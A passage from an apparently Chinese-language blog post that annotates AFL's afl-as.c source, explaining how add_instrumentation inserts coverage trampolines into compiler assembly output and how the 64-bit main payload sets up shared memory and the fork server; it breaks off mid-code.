id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h3><ul><li>打开输入函数和输出函数</li><li>逐行读取汇编代码，根据条件插入插桩程序<ul><li>如果当前行满足插桩条件则进行插桩并且增加插桩计数器</li><li>存入当前行汇编代码</li><li>在 text 段<ul><li>处理位数（32 &#x2F; 64），检测是 intel &#x2F; att 语法模式，检测是 APP &#x2F; NO_APP，根据检测结果设置 </li><li>skip_intel 和 skip_app 都是 0 且是条件跳转分支（存在：且开头是.?n） &#x2F; 函数入口标签(存在：)时设置 instrument_next 为 1，表示在下一条指令插入插桩代码</li></ul></li></ul></li><li>根据程序位数插入 main_payload_64 &#x2F; main_payload_32</li></ul><p>一个汇编程序的例子：</p><p>test.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> a <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Y"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"N"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//gcc -S test.c -o test.s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>test.s</p><blockquote><p>LC：gcc 非分支标签L0：gcc 分支标签</p><p>.Ltmp0：clang非分支标签.LBB0_0：clang 分支标签</p><p>jnz foo：条件分支jmp foo：非条件跳转</p></blockquote><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.file&quot;test.c&quot;.text.section.rodata.LC0:.string&quot;Y&quot;.LC1:.string&quot;N&quot;.text.globltest.typetest, @functiontest:.LFB0:.cfi_startprocendbr64pushq%rbp.cfi_def_cfa_offset 16.cfi_offset 6, -16movq%rsp, %rbp.cfi_def_cfa_register 6subq$16, %rspmovl$1, -4(%rbp)cmpl$0, -4(%rbp)jg.L2leaq.LC0(%rip), %rdicallputs@PLTjmp.L1.L2:leaq.LC1(%rip), %rdicallputs@PLTnop.L1:leave.cfi_def_cfa 7, 8ret.cfi_endproc.LFE0:.sizetest, .-test.globlmain.typemain, @functionmain:.LFB1:.cfi_startprocendbr64pushq%rbp.cfi_def_cfa_offset 16.cfi_offset 6, -16movq%rsp, %rbp.cfi_def_cfa_register 6movl$0, %eaxcalltestmovl$0, %eaxpopq%rbp.cfi_def_cfa 7, 8ret.cfi_endproc.LFE1:.sizemain, .-main.ident&quot;GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0&quot;.section.note.GNU-stack,&quot;&quot;,@progbits.section.note.gnu.property,&quot;a&quot;.align 8.long 1f - 0f.long 4f - 1f.long 50:.string &quot;GNU&quot;1:.align 8.long 0xc0000002.long 3f - 2f2:.long 0x33:.align 84:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>^</code> 是一个特殊字符，表示行的开头，用于匹配字符串或行的起始位置</p><p><code>\t</code>开头且第二个是字母的是 指令行</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">add_instrumentation</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>input_file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    inf <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>inf<span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to read '%s'"</span><span class="token punctuation">,</span> input_file<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> inf <span class="token operator">=</span> <span class="token constant">stdin</span><span class="token punctuation">;</span><span class="token comment">//打开 input_file,文件为空则 fd 为 stdin 标准输入</span>  outfd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>modified_file<span class="token punctuation">,</span> O_WRONLY <span class="token operator">|</span> O_EXCL <span class="token operator">|</span> O_CREAT<span class="token punctuation">,</span> <span class="token number">0600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开 modified_file</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>outfd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to write to '%s'"</span><span class="token punctuation">,</span> modified_file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开失败报错</span>  outf <span class="token operator">=</span> <span class="token function">fdopen</span><span class="token punctuation">(</span>outfd<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//得到 outf 这个 FILE* 指针，fdopen 函数将参数 fd 的文件描述符转化为文件指针</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>outf<span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"fdopen() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//获取失败则报错</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> MAX_LINE<span class="token punctuation">,</span> inf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//逐行从输入文件中读取</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pass_thru <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>skip_intel <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>skip_app <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>skip_csect <span class="token operator">&amp;&amp;</span> instr_ok <span class="token operator">&amp;&amp;</span>        instrument_next <span class="token operator">&amp;&amp;</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\t'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isalpha</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果当前是指令行且满足插桩条件</span>      <span class="token function">fprintf</span><span class="token punctuation">(</span>outf<span class="token punctuation">,</span> use_64bit <span class="token operator">?</span> trampoline_fmt_64 <span class="token operator">:</span> trampoline_fmt_32<span class="token punctuation">,</span> <span class="token function">R</span><span class="token punctuation">(</span>MAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//插入插桩代码</span>      instrument_next <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//instrument_next 标志清零，表示当前行已经插入插桩代码</span>      ins_lines<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//插桩计数器增加</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fputs</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> outf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//插入插桩代码后将当前行插入</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pass_thru<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\t'</span> <span class="token operator">&amp;&amp;</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//当前行以 \t.开头</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>clang_mode <span class="token operator">&amp;&amp;</span> instr_ok <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"p2align "</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>          <span class="token function">isdigit</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> line<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\n'</span><span class="token punctuation">)</span> skip_next_label <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"text\n"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"section\t.text"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"section\t__TEXT,__text"</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"section __TEXT,__text"</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        instr_ok <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token comment">//在 \t.text\n, \t.section\t.text, \t.section\t__TEXT,__text, \t.section __TEXT, __text 中则设置 instr_ok 为 1</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"section\t"</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"section "</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"bss\n"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"data\n"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        instr_ok <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token comment">//在 \t.section\t, \t.section, \t.bss\n, \t.data\n 中则设置 instr_ok 为 0</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">".code"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">".code32"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> skip_csect <span class="token operator">=</span> use_64bit<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">".code64"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> skip_csect <span class="token operator">=</span> <span class="token operator">!</span>use_64bit<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//根据程序是 32 位还是 64 位设置 skip_csect</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">".intel_syntax"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> skip_intel <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//检测到 .intel_syntax，表示进入 Intel 语法模式，跳过插桩</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">".att_syntax"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> skip_intel <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//检测到 .att_syntax，表示回到 AT&amp;T 语法模式，恢复插桩</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'#'</span> <span class="token operator">||</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'#'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">"#APP"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> skip_app <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">"#NO_APP"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> skip_app <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//检测到 #APP 则跳过插桩，检测到 #NO_APP 则恢复插桩</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>skip_intel <span class="token operator">||</span> skip_app <span class="token operator">||</span> skip_csect <span class="token operator">||</span> <span class="token operator">!</span>instr_ok <span class="token operator">||</span>        line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'#'</span> <span class="token operator">||</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">' '</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token comment">//存在需要跳过的条件则跳过该行</span>    <span class="token comment">//条件分支指令（jnz 等）。我们将检测附加到分支之后（用于检测未采用的路径）和分支目标标签（稍后处理）</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\t'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'j'</span> <span class="token operator">&amp;&amp;</span> line<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token char">'m'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">R</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> inst_ratio<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//条件跳转指令且满足插桩概率则插桩，非条件跳转例如 jmp 不会插桩</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span>outf<span class="token punctuation">,</span> use_64bit <span class="token operator">?</span> trampoline_fmt_64 <span class="token operator">:</span> trampoline_fmt_32<span class="token punctuation">,</span> <span class="token function">R</span><span class="token punctuation">(</span>MAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ins_lines<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>    <span class="token comment">/* Everybody else: .L&lt;whatever>: */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//检测分支目标标签，例如 .L0:</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>        <span class="token comment">/* .L0: or LBB0_0: style jump destination */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>       <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>        <span class="token comment">/* Apple: .L&lt;num> / .LBB&lt;num> */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>clang_mode <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"LBB"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">R</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> inst_ratio<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//.?n: 或 clang 模式下 .LBB 且满足插桩概率</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>skip_next_label<span class="token punctuation">)</span> instrument_next <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//如果未设置 skip_next_label ，标签符合插桩条件，则设置 instrument_next = 1，表示在下一条指令插入插桩代码</span>          <span class="token keyword">else</span> skip_next_label <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//否则设置 skip_next_label 为 0</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/* Function label (always instrumented, deferred mode). */</span>        instrument_next <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//有冒号，不是分支目标标签，则是函数入口点标签，在下一条进行插桩</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ins_lines<span class="token punctuation">)</span>    <span class="token function">fputs</span><span class="token punctuation">(</span>use_64bit <span class="token operator">?</span> main_payload_64 <span class="token operator">:</span> main_payload_32<span class="token punctuation">,</span> outf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//根据程序位数插入 main_payload_64 / main_payload_32</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>input_file<span class="token punctuation">)</span> <span class="token function">fclose</span><span class="token punctuation">(</span>inf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span>outf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>be_quiet<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ins_lines<span class="token punctuation">)</span> <span class="token function">WARNF</span><span class="token punctuation">(</span><span class="token string">"No instrumentation targets found%s."</span><span class="token punctuation">,</span> pass_thru <span class="token operator">?</span> <span class="token string">" (pass-thru mode)"</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"Instrumented %u locations (%s-bit, %s mode, ratio %u%%)."</span><span class="token punctuation">,</span>             ins_lines<span class="token punctuation">,</span> use_64bit <span class="token operator">?</span> <span class="token string">"64"</span> <span class="token operator">:</span> <span class="token string">"32"</span><span class="token punctuation">,</span>             <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_HARDEN"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"hardened"</span> <span class="token operator">:</span>              <span class="token punctuation">(</span>sanitizer <span class="token operator">?</span> <span class="token string">"ASAN/MSAN"</span> <span class="token operator">:</span> <span class="token string">"non-hardened"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>             inst_ratio<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="插桩汇编代码"><a href="#插桩汇编代码" class="headerlink" title="插桩汇编代码"></a>插桩汇编代码</h3><p>trampoline_fmt_32 和 main_payload_32 见源码</p><p>trampoline_fmt_64：</p><ul><li>保存寄存器的值</li><li>将当前的代码位置加载到 rcx 寄存器</li><li>调用 __afl_maybe_log</li><li>恢复寄存器的值</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">static const u8* trampoline_fmt_64 &#x3D;  &quot;\n&quot;  &quot;&#x2F;* --- AFL TRAMPOLINE (64-BIT) --- *&#x2F;\n&quot;  &quot;\n&quot;  &quot;.align 4\n&quot;  &quot;\n&quot;  &quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;  &quot;movq %%rdx,  0(%%rsp)\n&quot;  &quot;movq %%rcx,  8(%%rsp)\n&quot;  &quot;movq %%rax, 16(%%rsp)\n&quot;;保存寄存器的值  &quot;movq $0x%08x, %%rcx\n&quot;;将当前的代码位置加载到 rcx 寄存器，%08x 是一个格式化占位符，表示一个 8 位的十六进制数  &quot;call __afl_maybe_log\n&quot;;调用 __afl_maybe_log 将当前的执行路径信息记录到共享内存中  &quot;movq 16(%%rsp), %%rax\n&quot;  &quot;movq  8(%%rsp), %%rcx\n&quot;  &quot;movq  0(%%rsp), %%rdx\n&quot;  &quot;leaq (128+24)(%%rsp), %%rsp\n&quot;;恢复寄存器的值  &quot;\n&quot;  &quot;&#x2F;* --- END --- *&#x2F;\n&quot;  &quot;\n&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>main_payload_64：</p><ul><li>入口点：__afl_maybe_log<ul><li>获取共享内存指针，未初始化则跳转到 __afl_setup 进行初始化</li><li>跳转到 __afl_store</li></ul></li><li>初始化共享内存：__afl_setup<ul><li>获取 __afl_setup_failure 判断是否已经进行过初始化并且失败，已经失败过就跳转到 __afl_return 进行返回避免重复初始化</li><li>如果全局共享内存指针已设置，直接跳转到 __afl_store</li><li>如果未设置，跳转到 __afl_setup_first 进行第一次初始化，调用后从 rdx 寄存器获取 __afl_setup_abort</li></ul></li><li>第一次初始化共享内存：__afl_setup_first<ul><li>将寄存器的值保存到栈上</li><li>获取环境变量中的共享内存 ID 并且转换成整数</li><li>使用 shmat 将共享内存映射到当前进程，如果失败跳转到 __afl_setup_abort</li><li>将全局共享内存地址存储到 __afl_global_area_ptr，将共享内存地址存储到  __afl_global_area_ptr 地址中，并且存放到 rdx 中</li></ul></li><li>初始化失败处理：__afl_setup_abort<ul><li>增加 __afl_setup_failure 的值</li><li>从栈上恢复所有寄存器</li><li>跳转到 __afl_return：返回主逻辑</li></ul></li><li>处理异常情况：__afl_die 退出程序</li><li>恢复标志寄存器状态并返回：__afl_return</li><li>Fork Server 模式：__afl_forkserver，通过 Fork Server 模式避免频繁调用 <code>execve</code>，提升 fuzz 效率<ul><li>通知父进程：向父进程发送一个信号，表示当前进程已准备好。</li><li>等待父进程指令：通过管道从父进程读取指令。如果读取失败，跳转到 <code>__afl_die</code>。</li><li>创建子进程：<ul><li>使用 <code>fork</code> 创建子进程。如果失败，跳转到 <code>__afl_die</code>。</li><li>子进程跳转到 <code>__afl_fork_resume</code>，父进程继续执行。</li></ul></li><li><strong>父进程逻辑</strong>：<ul><li>父进程将子进程的 PID 写入管道。</li><li>父进程调用 <code>waitpid</code> 等待子进程执行完毕。</li><li>父进程将子进程的退出状态写入管道，然后回到 <code>__afl_fork_wait_loop</code>。</li></ul></li></ul></li><li>子进程恢复执行：__afl_fork_resume</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">static const u8* main_payload_64 &#x3D;   &quot;\n&quot;  &quot;&#x2F;* --- AFL MAIN PAYLOAD (64-BIT) --- *&#x2F;\n&quot;  &quot;\n&quot;  &quot;.text\n&quot;  &quot;.att_syntax\n&quot;  &quot;.code64\n&quot;  &quot;.align 8\n&quot;  &quot;\n&quot;  &quot;__afl_maybe_log:\n&quot;  &quot;\n&quot;#if defined(__OpenBSD__)  || (defined(__FreeBSD__) &amp;&amp; (__FreeBSD__ &lt; 9))  